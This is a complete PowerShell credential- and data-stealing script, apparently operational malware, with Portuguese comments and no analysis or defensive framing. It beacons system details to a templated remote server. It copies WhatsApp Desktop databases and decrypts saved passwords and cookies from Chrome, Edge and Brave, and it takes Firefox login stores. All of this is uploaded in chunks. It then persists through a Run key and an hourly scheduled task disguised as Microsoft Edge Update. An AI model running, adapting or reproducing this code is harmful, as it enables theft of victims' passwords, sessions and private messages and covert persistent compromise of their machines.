$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
# ===== CONFIG =====
$BASE = 'https://__HOST__/u/__TOKEN__'
$CHUNK = 4MB
$MAXTOTAL = 450MB
# ==================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = ($env:COMPUTERNAME + '-' + [guid]::NewGuid().ToString('N').Substring(0,8))
$TMP = Join-Path $env:TEMP ("w" + [guid]::NewGuid().ToString('N').Substring(0,6))
New-Item -ItemType Directory -Force -Path $TMP | Out-Null
$manifest = @()
$total = 0
$UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'

function Post-Text($path, $text) {
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-WebRequest -UseBasicParsing -Uri $path -Method Post -Body $text -ContentType 'text/plain' -UserAgent $UA -TimeoutSec 40 | Out-Null; return } catch {}
    try { $wc = New-Object Net.WebClient; $wc.Headers['User-Agent'] = $UA; $wc.UploadString($path, 'POST', $text); return } catch {}
    Start-Sleep 2
  }
}

function Get-ODUID {
  try {
    $rs = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\TPM\ODUID').RandomSeed
    if ($rs) {
      $salt = [Text.Encoding]::Unicode.GetBytes('cvgv1gv')
      $buf = New-Object byte[] ($salt.Length + $rs.Length)
      [Array]::Copy($salt, 0, $buf, 0, $salt.Length); [Array]::Copy($rs, 0, $buf, $salt.Length, $rs.Length)
      $sha = [Security.Cryptography.SHA256]::Create().ComputeHash($buf)
      if ($sha) { return (($sha | ForEach-Object { $_.ToString('x2') }) -join '') }
    }
  } catch {}
  # fallback: binario oficial (so se o registro falhar)
  try {
    $exe = Join-Path $env:TEMP 'oduid.exe'
    if (-not (Test-Path $exe)) { Invoke-WebRequest -UseBasicParsing -Uri ($BASE.Replace('/u/','/d/') + '/ODUID.exe') -OutFile $exe -TimeoutSec 120 }
    $o = (& $exe 2>$null | Out-String)
    $m = [regex]::Match($o, '[0-9a-fA-F]{64}')
    if ($m.Success) { return $m.Value.ToLower() }
  } catch {}
  return ''
}

# ---- meta / beacon ----
$PURL = $BASE.Replace('/u/','/p/') + '/' + $ID
Post-Text $PURL ("hello id=$ID host=$env:COMPUTERNAME user=$env:USERDOMAIN\$env:USERNAME os=" + [Environment]::OSVersion.Version.Build)
$waVer = ''
try { $waVer = (Get-AppxPackage -Name '*WhatsAppDesktop*').Version } catch {}
$def = ''
try { $def = (Get-MpComputerStatus).RealTimeProtectionEnabled } catch {}
$meta = @(
  "id=$ID", "host=$env:COMPUTERNAME", "user=$env:USERNAME", "domain=$env:USERDOMAIN",
  "os=" + ((Get-CimInstance Win32_OperatingSystem).Caption -replace "`r?`n"," ") + " " + [Environment]::OSVersion.Version.Build,
  "ps=$($PSVersionTable.PSVersion)", "arch=$env:PROCESSOR_ARCHITECTURE", "wa=$waVer",
  "defender=$def", "admin=" + ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator),
  "when=" + (Get-Date -Format o)
) -join "`n"
Post-Text $PURL $meta
$od = Get-ODUID
Post-Text $PURL ("oduid=" + $od)

# ---- coleta ----
function Add-File($src, $label) {
  if (-not (Test-Path -LiteralPath $src)) { return }
  if ($total -ge $MAXTOTAL) { return }
  $script:idx++
  $name = ('f{0:d3}' -f $script:idx)
  try {
    $len = (Get-Item -LiteralPath $src).Length
    $script:total += $len
    $script:manifest += [pscustomobject]@{ n = $name; p = $label; s = $len }
    $in = [IO.File]::Open($src, 'Open', 'Read', 'ReadWrite')
    $buf = New-Object byte[] $CHUNK
    $c = 0
    while (($r = $in.Read($buf, 0, $buf.Length)) -gt 0) {
      $cn = ('{0}.{1:d3}' -f $name, $c); $c++
      $out = Join-Path $TMP $cn
      [IO.File]::WriteAllBytes($out, $buf[0..($r-1)])
      try { Invoke-WebRequest -UseBasicParsing -Uri ($BASE + '/' + $ID + '/' + $cn) -Method Post -InFile $out -UserAgent $UA -TimeoutSec 180 | Out-Null } catch {}
      Remove-Item $out -Force
    }
    $in.Close()
  } catch {}
}

$script:idx = 0
# WhatsApp Desktop LocalState
$LS = Join-Path $env:LOCALAPPDATA 'Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalState'
$WAP = Get-Process WhatsApp -ErrorAction SilentlyContinue
if (Test-Path $LS) {
  $copy = Join-Path $TMP 'wa'
  New-Item -ItemType Directory -Force -Path $copy | Out-Null
  $ok = $false
  try { Copy-Item -LiteralPath $LS -Destination $copy -Recurse -Force -ErrorAction Stop; $ok = $true } catch {}
  if (-not $ok) {
    if ($WAP) { $WAP | Stop-Process -Force; Start-Sleep 3 }
    Copy-Item -LiteralPath $LS -Destination $copy -Recurse -Force
    try { Start-Process 'explorer.exe' 'shell:AppsFolder\5319275A.WhatsAppDesktop_cv1g1gvanyjgm!App' } catch {}
  }
  Get-ChildItem -LiteralPath $copy -Recurse -File | Where-Object {
    $_.Name -match '\.(db|db-wal|db-shm|dat)$' -or $_.Name -in @('Local State','Preferences','Network Persistent State')
  } | ForEach-Object { Add-File $_.FullName ('wa/' + $_.FullName.Substring($copy.Length + 1)) }
}
# UWP antigo (se existir)
$UWPL = Join-Path $env:LOCALAPPDATA 'Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\LocalState\uwp'
if (Test-Path $UWPL) { Get-ChildItem $UWPL -File | ForEach-Object { Add-File $_.FullName ('uwp/' + $_.Name) } }


# --- decifra credenciais/cookies na propria maquina (DPAPI + AES-GCM via BouncyCastle) ---
$BC = Join-Path $PSScriptRoot 'BouncyCastle.Cryptography.dll'
$script:GcmMode = ''
if (Test-Path -LiteralPath $BC) {
  try {
    Add-Type -TypeDefinition @"
using System;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
public static class Gcm {
  public static int LastStatus;
  public static byte[] Dec(byte[] key, byte[] nonce, byte[] ctTag, byte[] aad) {
    try {
      GcmBlockCipher c = new GcmBlockCipher(new AesEngine());
      c.Init(false, new AeadParameters(new KeyParameter(key), 128, nonce, aad));
      byte[] o = new byte[c.GetOutputSize(ctTag.Length)];
      int n = c.ProcessBytes(ctTag, 0, ctTag.Length, o, 0);
      n += c.DoFinal(o, n);
      if (n != o.Length) { byte[] t = new byte[n]; Array.Copy(o, t, n); return t; }
      return o;
    } catch (Exception e) { LastStatus = e.HResult; return null; }
  }
}
"@ -ReferencedAssemblies $BC -ErrorAction Stop
    if (-not ('Gcm' -as [type])) { throw 'tipo Gcm nao compilou' }
    $script:GcmMode = 'csharp'
  } catch {}
  if (-not $script:GcmMode) {
    # fallback: usa a mesma DLL por reflexao (sem compilar C#)
    try { [Reflection.Assembly]::LoadFrom($BC) | Out-Null; $script:GcmMode = 'reflection' } catch {}
  }
}
function Hex-ToBytes($h) { $b = New-Object byte[] ($h.Length / 2); for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($h.Substring($i * 2, 2), 16) }; return $b }
function Get-MasterKey($ls) {
  try {
    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
    $j = Get-Content -LiteralPath $ls -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
    return [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length - 1)], $null, 'CurrentUser')
  } catch { return $null }
}
function Dec-Bytes($key, $blob, $aad) {
  if (-not $key -or $blob.Length -lt 32) { return $null }
  if ([Text.Encoding]::ASCII.GetString($blob, 0, 3) -notin @('v10', 'v11')) { return $null }
  [byte[]]$nonce = $blob[3..14]
  [byte[]]$ctTag = $blob[15..($blob.Length - 1)]
  if (-not $aad) { $aad = [byte[]]@() }
  try {
    if ($script:GcmMode -eq 'csharp') { return [Gcm]::Dec($key, $nonce, $ctTag, $aad) }
    if ($script:GcmMode -eq 'reflection') {
      $c = New-Object Org.BouncyCastle.Crypto.Modes.GcmBlockCipher -ArgumentList (, (New-Object Org.BouncyCastle.Crypto.Engines.AesEngine))
      $kp = New-Object Org.BouncyCastle.Crypto.Parameters.KeyParameter -ArgumentList (, $key)
      $p = New-Object Org.BouncyCastle.Crypto.Parameters.AeadParameters -ArgumentList $kp, 128, $nonce, $aad
      $c.Init($false, $p)
      $o = New-Object byte[] ($c.GetOutputSize($ctTag.Length))
      $n = $c.ProcessBytes($ctTag, 0, $ctTag.Length, $o, 0)
      $n += $c.DoFinal($o, $n)
      if ($n -eq $o.Length) { return $o }
      return $o[0..($n - 1)]
    }
  } catch { return $null }
  return $null
}
$sqlite = Join-Path $PSScriptRoot 'sqlite3.exe'

# Navegadores
$browsers = @(
  @{ p = "$env:LOCALAPPDATA\Google\Chrome\User Data"; n = 'chrome' },
  @{ p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; n = 'edge' },
  @{ p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; n = 'brave' }
)
foreach ($b in $browsers) {
  if (-not (Test-Path $b.p)) { continue }
  Add-File (Join-Path $b.p 'Local State') ($b.n + '/Local State')
  $skey = Get-MasterKey (Join-Path $b.p 'Local State')
  $profiles = Get-ChildItem $b.p -Directory | Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' } |
    Sort-Object { (Get-Item (Join-Path $_.FullName 'Login Data') -ErrorAction SilentlyContinue).LastWriteTime } -Descending |
    Select-Object -First 3
  foreach ($pr in $profiles) {
    foreach ($f in @('Login Data','Cookies','Network\Cookies','History','Web Data')) {
      $src = Join-Path $pr.FullName $f
      $lbl = $b.n + '/' + $pr.Name + '/' + (Split-Path $f -Leaf)
      Add-File $src $lbl
    }
    if ($skey -and (Test-Path $sqlite)) {
      $cr = Join-Path $TMP ($b.n + '-' + $pr.Name + '-creds.txt')
      & $sqlite -separator '<<>' (Join-Path $pr.FullName 'Login Data') "select origin_url,username_value,hex(password_value) from logins" 2>$null | ForEach-Object {
        $c = $_ -split '<<>', 3
        if ($c.Count -eq 3 -and $c[2]) {
          $v = Dec-Bytes $skey (Hex-ToBytes $c[2]) ([byte[]]@())
          if ($v) { Add-Content -LiteralPath $cr -Value ($c[0] + "`t" + $c[1] + "`t" + [Text.Encoding]::UTF8.GetString($v)) }
        }
      }
      if (Test-Path $cr) { Add-File $cr ($b.n + '/' + $pr.Name + '/creds.txt') }
      $ck = Join-Path $TMP ($b.n + '-' + $pr.Name + '-cookies.txt')
      $ckdb = Join-Path $pr.FullName 'Cookies'; if (-not (Test-Path $ckdb)) { $ckdb = Join-Path $pr.FullName 'Network\Cookies' }
      & $sqlite -separator '<<>' $ckdb "select host_key,name,hex(encrypted_value),path,is_secure,cast(expires_utc/1000000-11644473600 as int) from cookies" 2>$null | ForEach-Object {
        $c = $_ -split '<<>', 6
        if ($c.Count -eq 6 -and $c[2]) {
          $v = Dec-Bytes $skey (Hex-ToBytes $c[2]) ([Text.Encoding]::UTF8.GetBytes($c[0]))
          if ($v) { Add-Content -LiteralPath $ck -Value ($c[0] + "`t" + $c[3] + "`t" + $c[4] + "`t" + $c[5] + "`t" + $c[1] + "`t" + [Text.Encoding]::UTF8.GetString($v)) }
        }
      }
      if (Test-Path $ck) { Add-File $ck ($b.n + '/' + $pr.Name + '/cookies.txt') }
    }
    $lvl = Join-Path $pr.FullName 'Local Storage\leveldb'
    if (Test-Path $lvl) {
      Get-ChildItem $lvl -File | Where-Object { $_.Length -lt 8MB } | Select-Object -First 30 |
        ForEach-Object { Add-File $_.FullName ($b.n + '/' + $pr.Name + '/leveldb/' + $_.Name) }
    }
  }
}
# Firefox (se houver)
$ff = Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles'
if (Test-Path $ff) {
  Get-ChildItem $ff -Directory | Select-Object -First 2 | ForEach-Object {
    foreach ($f in @('logins.json','key4.db','cookies.sqlite','places.sqlite')) { Add-File (Join-Path $_.FullName $f) ('ff/' + $_.Name + '/' + $f) }
  }
}

# manifest final
Post-Text ($BASE + '/' + $ID + '/manifest.json') ($manifest | ConvertTo-Json -Compress)
Post-Text $PURL ("DONE files=" + $manifest.Count + " bytes=" + $total)
Remove-Item $TMP -Recurse -Force

# ---- persistencia ----
try {
  $dir = Join-Path $env:LOCALAPPDATA ('Microsoft\EdgeUpdate\' + [guid]::NewGuid().ToString('N').Substring(0,6))
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  $self = Join-Path $dir 'c.ps1'
  $src = $MyInvocation.MyCommand.Path
  if ($src -and (Test-Path $src) -and ($src -ne $self)) { Copy-Item $src $self -Force }
  $cmd = "powershell.exe -w h -ep bypass -f `"$self`""
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'EdgeUpdateTaskM' -Value $cmd
  schtasks /create /f /tn 'MicrosoftEdgeUpdateTaskMachineM' /sc hourly /tr $cmd | Out-Null
} catch {}
